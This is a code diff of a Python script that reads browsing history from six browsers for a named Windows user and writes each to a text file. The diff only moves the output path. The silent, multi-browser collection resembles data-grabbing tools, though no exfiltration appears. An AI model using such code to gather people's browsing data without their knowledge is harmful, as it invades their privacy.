@@ -62,7 +62,7 @@ try:
     hist = opera_gx_history_getter(uname=uname)
     hist = str(hist)
     acc_dir = os.getcwd()
-    file_path = rf"{acc_dir}\main\{uname}_operaGX.txt"
+    file_path = rf"{acc_dir}\{uname}_operaGX.txt"
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(hist)
 except Exception:
@@ -72,7 +72,7 @@ try:
     hist = chrome_history_getter(uname=uname)
     hist = str(hist)
     acc_dir = os.getcwd()
-    file_path = rf"{acc_dir}\main\{uname}_chrome.txt"
+    file_path = rf"{acc_dir}\{uname}_chrome.txt"
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(hist)
 except Exception:
@@ -88,7 +88,7 @@ try:
             path = f"C:\\Users\\{uname}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
     hist = str(hist)
     acc_dir = os.getcwd()
-    file_path = rf"{acc_dir}\main\{uname}_firefox.txt"
+    file_path = rf"{acc_dir}\{uname}_firefox.txt"
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(hist)
 except Exception:
@@ -99,7 +99,7 @@ try:
     hist = brave_history_getter(uname=uname)
     hist = str(hist)
     acc_dir = os.getcwd()
-    file_path = rf"{acc_dir}\main\{uname}_brave.txt"
+    file_path = rf"{acc_dir}\{uname}_brave.txt"
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(hist)
 except Exception:
@@ -110,7 +110,7 @@ try:
     hist = edge_history_getter(uname=uname)
     hist = str(hist)
     acc_dir = os.getcwd()
-    file_path = rf"{acc_dir}\main\{uname}_edge.txt"
+    file_path = rf"{acc_dir}\{uname}_edge.txt"
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(hist)
 except Exception:
@@ -120,7 +120,7 @@ try:
     hist = opera_history_getter(uname=uname)
     hist = str(hist)
     acc_dir = os.getcwd()
-    file_path = rf"{acc_dir}\main\{uname}_opera.txt"
+    file_path = rf"{acc_dir}\{uname}_opera.txt"
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(hist)
 except Exception:
